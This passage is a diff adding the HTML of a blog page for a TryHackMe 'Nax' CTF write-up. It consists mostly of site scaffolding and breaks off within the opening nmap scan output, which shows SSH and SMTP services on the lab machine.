@@ -1,0 +1,1336 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Tryhackme - Nax &middot; Re-toor</title>
+    <meta name="title" content="Tryhackme - Nax &middot; Re-toor">
+  
+
+  
+  
+  
+    <meta name="keywords" content="web,linux,ppm,nagios,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/ctf/tryhackme/nax/">
+  
+
+  
+  
+    <meta name="author" content="TAH">
+  
+  
+    
+      
+        
+          <link href="https://github.com/re-toor" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/ctf/tryhackme/nax/">
+  <meta property="og:site_name" content="Re-toor">
+  <meta property="og:title" content="Tryhackme - Nax">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2022-05-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-05-05T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Ppm">
+    <meta property="article:tag" content="Nagios">
+    <meta property="og:image" content="http://localhost:1313/ctf/tryhackme/nax/feature.jpg">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/ctf/tryhackme/nax/feature.jpg">
+  <meta name="twitter:title" content="Tryhackme - Nax">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
+    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
+      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Ctf",
+    "name": "Tryhackme - Nax",
+    "headline": "Tryhackme - Nax",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/ctf/tryhackme/nax/",
+    "author" : {
+      "@type": "Person",
+      "name": "TAH"
+    },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-05-05T00:00:00\u002b00:00",
+    "datePublished": "2022-05-05T00:00:00\u002b00:00",
+    
+    "dateModified": "2022-05-05T00:00:00\u002b00:00",
+    
+    "keywords": ["web","linux","ppm","nagios"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1340"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "TryHackMe",
+            "item": "http://localhost:1313/ctf/tryhackme/"
+          },{
+            "@type": "ListItem",
+            "position":  2 ,
+            "name": "Ctf",
+            "item": "http://localhost:1313/ctf/"
+          },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "name": "Tryhackme - Nax",
+        "item": "http://localhost:1313/ctf/tryhackme/nax/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Re-toor
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/blog/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="Blog">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/soc/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="SOC"
+      title="SOC">
+      
+      
+        <span class="text-base font-medium break-normal">
+          SOC
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/ctf/"
+            
+          
+          aria-label="CTF"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Ctf">
+          
+          <span class="text-bg font-bg break-normal" title="Ctf">
+            CTF
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/ctf/hackthebox/"
+                
+                aria-label="HackTheBox"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="HackTheBox">
+                  HackTheBox
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/tryhackme/"
+                
+                aria-label="TryHackMe"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="TryHackMe">
+                  TryHackMe
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/selfdev/"
+                
+                aria-label="Self-dev"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Self-dev">
+                  Self-dev
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+      
+  
+    <a
+      href="/about/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About"
+      title="About">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/blog/"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Blog" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/soc/"
+        aria-label="SOC"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="SOC" class="text-2xl font-bold tracking-tight">
+          SOC
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/ctf/"
+        aria-label="CTF"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Ctf" class="text-2xl font-bold tracking-tight">
+          CTF
+        </span>
+        
+          <label
+            for="fullscreen-submenu-ctf"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/ctf/hackthebox/"
+                  aria-label="HackTheBox"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="HackTheBox" class="text-lg">
+                    HackTheBox
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/tryhackme/"
+                  aria-label="TryHackMe"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="TryHackMe" class="text-lg">
+                    TryHackMe
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/selfdev/"
+                  aria-label="Self-dev"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Self-dev" class="text-lg">
+                    Self-dev
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/about/"
+        aria-label="About"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="About" class="text-2xl font-bold tracking-tight">
+          About
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/ctf/tryhackme/nax/feature_hu_44f34a183b4997ad.jpg"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/ctf/tryhackme/nax/feature_hu_44f34a183b4997ad.jpg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Tryhackme - Nax
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2022-05-05T00:00:00&#43;00:00">5 May 2022</time><span class="px-2 text-primary-500">&middot;</span><span>1340 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Hôm nay tôi sẽ giải CTF <a href="https://tryhackme.com/room/nax"  target="_blank" rel="noreferrer">TryHackMe - Nax</a></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>    <span class="n">REASON</span>         <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="n">OpenSSH</span> <span class="mf">7.2</span><span class="n">p2</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu2</span><span class="mf">.8</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">62</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="n">d9</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">77</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="n">bb</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="n">f9</span><span class="p">:</span><span class="n">da</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="n">e3</span><span class="p">:</span><span class="n">cd</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABAQCw9lXSbmWYgGcDpP5NiHE9MMRQktk72HpmKY50dVs</span><span class="o">/</span><span class="n">GbfJMNa29eJNKsZ2XfAVsGUuxRdX42</span><span class="o">/</span><span class="n">fvaAUOoSZlNlARJUOhS</span><span class="o">+</span><span class="mi">3</span><span class="n">fRX14Qx9itHqEoYTXXnSZ</span><span class="o">+</span><span class="n">lYc4HGbMkbGlbW3CqQ6zxO9kEbe8DbFi9BPkGOvjMk5mrVYqOpROlZwJvwCtK4g</span><span class="o">+</span><span class="n">LNkZibj3VZvZ</span><span class="o">+</span><span class="n">Ex410r4Xqd4TeIe</span><span class="o">+</span><span class="n">NRVmCEG5I57w60wZTwS6WAhQ86Td8ZhDr0hlN82vKe8KK8Q6Qyt4NNa4GrwJAil0DMSSrSdgiFPWfSBN0RcaGq6xTyd3m4bUmKfqSJ</span><span class="o">+</span><span class="n">hhvpoQ5CJNQK5dtIfLulV5iEVWXKtV</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="n">af</span><span class="p">:</span><span class="mi">67</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="n">e5</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="n">f4</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">72</span><span class="p">:</span><span class="n">d1</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">15</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA6AY</span><span class="o">/</span><span class="n">MaydX6jLtiYXUhTaSQuNB4h08nsJd8MIxQ4b77d5qBK89b0rXrmxH8TavI5HpHOnAYeSMWcgrWcKAnBXk</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">c8</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="mi">2</span><span class="n">f</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">1</span><span class="n">e</span><span class="p">:</span><span class="mi">57</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssh</span><span class="o">-</span><span class="n">ed25519</span> <span class="n">AAAAC3NzaC1lZDI1NTE5AAAAICcps6PPy9z</span><span class="o">/</span><span class="n">iS7bgKohT</span><span class="o">/</span><span class="n">GXERf6a6hWzhuWyeNMtzcw</span>
+</span></span><span class="line"><span class="cl"><span class="mi">25</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">smtp</span>       <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="n">Postfix</span> <span class="n">smtpd</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">ubuntu</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Issuer</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">ubuntu</span>
